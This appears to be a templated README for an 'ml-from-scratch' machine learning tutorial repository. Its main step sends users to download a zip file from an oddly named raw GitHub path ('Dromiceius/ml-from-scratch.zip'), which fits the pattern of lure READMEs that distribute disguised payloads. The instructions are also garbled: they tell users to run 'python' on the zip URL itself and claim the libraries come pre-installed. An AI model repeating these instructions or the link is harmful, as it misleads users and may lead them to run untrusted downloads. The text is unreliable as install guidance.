You can explore algorithms for classification, regression, and more, all presented in an easy-to-follow way.

## üöÄ Getting Started
To get started with **ml-from-scratch**, follow these steps to download and run the software.

## üíª System Requirements
- **Operating System:** Windows, macOS, or Linux
- **Python Version:** 3.6 or higher
- **Required Libraries:** These libraries come pre-installed, but if you wish, you can install them using the command line:
  - NumPy
  - Pandas
  - Matplotlib
  - Seaborn
  - Scikit-learn

## üì• Download & Install
To download the latest version of the software, visit [this page to download](https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip).

1. Click the link above.
2. Look for the latest release. It will contain details about the version.
3. Download the appropriate file for your operating system. This could be a ZIP file that you will extract or a direct installation file.

## üìÇ Extracting Files
If you downloaded a ZIP file, follow these steps to extract and access the contents:

1. Locate the file in your downloads folder.
2. Right-click on the file and select "Extract All..."
3. Choose a destination folder and click "Extract".

Now you are ready to run the application.

## üêç Running the Application
After downloading and extracting, you will find Jupyter Notebook files or Python scripts. To run them:

### Using Jupyter Notebook
1. Open a command prompt or terminal window.
2. Navigate to the folder where you extracted the files. Use the `cd` command (for example: `cd path/to/your/folder`).
3. Start Jupyter Notebook by typing `jupyter notebook` and press Enter.
4. Your web browser will open, showing the Jupyter interface. Click on any notebook to start exploring machine learning models.

### Running Python Scripts
1. Open a command prompt or terminal window.
2. Navigate to the folder where you extracted the files.
3. Type `python https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip` and replace `https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip` with the name of the file you want to run.
4. Press Enter. Follow the instructions printed in the terminal for results.

## üìä Understanding the Models
This repository includes different Python scripts and notebooks. Each one contains explanations and examples of machine learning concepts. Here‚Äôs a quick overview of what you can expect:

- **Classification Models:** Learn how to classify data points into categories using methods like decision trees and logistic regression.
  
- **Regression Models:** Understand how to predict continuous values using techniques like linear regression and polynomial regression.

- **Clustering Models:** Explore methods to group data points that are similar, such as K-Means clustering.

- **Visualization Tools:** Use tools to create graphs and visualizations that help interpret your data.

## ‚öôÔ∏è Customizing Your Experience
You can modify the code in each notebook or script to experiment with different datasets or parameters. This hands-on approach lets you see how changes affect outcomes. 

## üìö Learning Resources
You might want to refer to these additional resources to strengthen your understanding:

- **Documentation:** Each file comes with comments and explanations within the code. Read these comments closely.
- **Tutorials:** There are many online tutorials for machine learning that can provide further insights.
- **Books:** Consider reading introductory books on Python and machine learning to consolidate your learning.
